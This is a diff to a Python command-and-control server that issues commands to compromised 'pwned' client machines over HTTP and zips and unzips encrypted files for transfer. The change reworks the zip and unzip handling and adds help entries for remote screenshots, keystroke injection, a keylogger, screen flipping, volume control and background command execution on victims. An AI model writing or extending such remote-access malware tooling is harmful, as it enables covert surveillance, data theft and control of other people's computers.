@@ -1,39 +1,6 @@
 #! /usr/bin/python3
 
 
-'''
-method 1
-to fix the windows client down and the server promt drop dead:
-put a command prompt in the beginning of the do_Get method
-the command variable will store the command 
-if the active client request comes in
-the stored command will assign to client command and response to client
-if the client is dead so no request from ex-actvie client 
-the loop will still be running, so we still have a prompt
-method 2
-start a timer after sending http response to active client
-if client post the result
-    stop and reset the timer
-elif the timer pass 20 sec
-    prompt : client seems dead do u wnat to start new seesion
-    if yes
-        start_new_session()
-    if no
-        continue
-        run the timer again
-method3
-timer checks active client request intervaly
-method4 
-a general command prompt that is independent
-will take the command and distribute the command to the right place 
-
-'''
-
-
-
-#! /usr/bin/python3
-
-#Command and Control server 
 from datetime import datetime
 from email.utils import unquote
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -185,38 +152,38 @@ class C2handler(BaseHTTPRequestHandler):
                             
                     # server command to unzip files on the server
                     elif command.startswith("server unzip"):
-                        filename = None
-                        
-                        try:
-                            filename = command.split()[2]
-                            with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
-                                zip_file.setpassword(ZIP_PASS)
-                                zip_file.extractall(INCOMING)
-                                print(f"{filename} is unzipped at {INCOMING}\n")
-                        except OSError:
-                            print(f"{filename} was not found in {INCOMING}\n")
-                        except IndexError:
-                            print("you must give a valid filename\n")
+                        filename = " ".join(command.split()[2:])
+                        if not filename:
+                            print("must give a filename in incoming directory\n")
+                        else:
+                            try:
+                                if not path.isfile(f"{INCOMING}/{filename}"):
+                                    raise OSError
+                                with AESZipFile(f"{INCOMING}/{filename}") as zip_file:
+                                    zip_file.setpassword(ZIP_PASS)
+                                    zip_file.extractall(INCOMING)
+                                    print(f"{filename} is unzipped at {INCOMING}\n")
+                            except OSError:
+                                print(f"unable to access {INCOMING}/{filename}\n")
                             
                     # "server zip [FILENAME]" command allows us to zip file in outgoing directory
                     elif command.startswith("server zip"):
-                        filename = None
-                        
-                        
-                        try:
-                            filename = command.split()[2]
-                            if not path.isfile(f"{OUTGOING}/{filename}"):
-                                raise OSError
+                        filename = " ".join(command.split()[2:]) 
+                        if not filename:
+                            print("must give a filename in outgoing directory\n")
+                        else:
+                            try:
+                                if not path.isfile(f"{OUTGOING}/{filename}"):
+                                    raise OSError
+                                with AESZipFile(f"{OUTGOING}/{filename}.zip", mode="w", compression=ZIP_LZMA, 
+                                                encryption=WZ_AES) as zip_file:
+                                    zip_file.setpassword(ZIP_PASS)
+                                    zip_file.write(f"{OUTGOING}/{filename}", filename)
+                                    print(f"{filename} is zipped at {OUTGOING}\n")
+                            except OSError:
+                                print(f"unable to access {OUTGOING}/{filename}\n")
                             
-                            with AESZipFile(f"{OUTGOING}/{filename}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
-                                zip_file.setpassword(ZIP_PASS)
-                                zip_file.write(f"{OUTGOING}/{filename}", filename)
-                                print(f"{filename} is zipped at {OUTGOING}/\n")
-                        except OSError:
-                            print(f"unable to access {OUTGOING}/{filename}\n")
-                        except IndexError:
-                            print(f"must give a filename in {OUTGOING}/\n")
-                    
+                                         
                     # list the directory of the server
                     elif command.startswith("server list"):
                         directory = None
@@ -266,6 +233,16 @@ class C2handler(BaseHTTPRequestHandler):
                             - client unzip [FILENAME]: Decrypt and unzip a file on the client.
                             - client delay [SECONDS]: Set the delay between reconnection attempts.
                             - client get clipboeard: Get a ccopy of client clipboard content.
+                            - client screenshot: Take a screenshot of the client's screen.
+                            - client type [TEXT]: Type text on the client. (windows or linux with X server or uinput)
+                            - clienr keylogger on / off: Start or stop the keylogger on the client. (windows or 
+                               linux with X server or uinput)
+                            - client diplay [image_file]: Display an image on the client screen.
+                            - client flip screen: Flip the client's screen upside down (Windows only).
+                            - client spin: Rotate the client's screen 90 degrees (Windows only).
+                            - client max volume: Set the client's volume to maximum. (windows or linux with X server or uinput)
+                            - client play [sound.wav]: Play a .wav sound file on the client (Windows only). 
+                            - [command] & : Run a command in the background on the client.
                         """)
                     
                     # Must send a response to client after a server command in order to finish the connection  
@@ -286,6 +263,7 @@ class C2handler(BaseHTTPRequestHandler):
                     else:    
                         # start a new session at  client kill
                         if command == "client kill":
+                            print(f"\033[91m[client kill]\033[0m {pwned_dic[active_session]}")
                             get_new_session()
                     
             # client is in pwned_dic but not our active session
@@ -424,6 +402,7 @@ if not path.isdir(OUTGOING):
 
 # initiate our server
 server = ThreadingHTTPServer((BIND_ADDR, PORT), C2handler)
+print("\n[*] waiting for new connection\n")
 
 server.serve_forever()
 
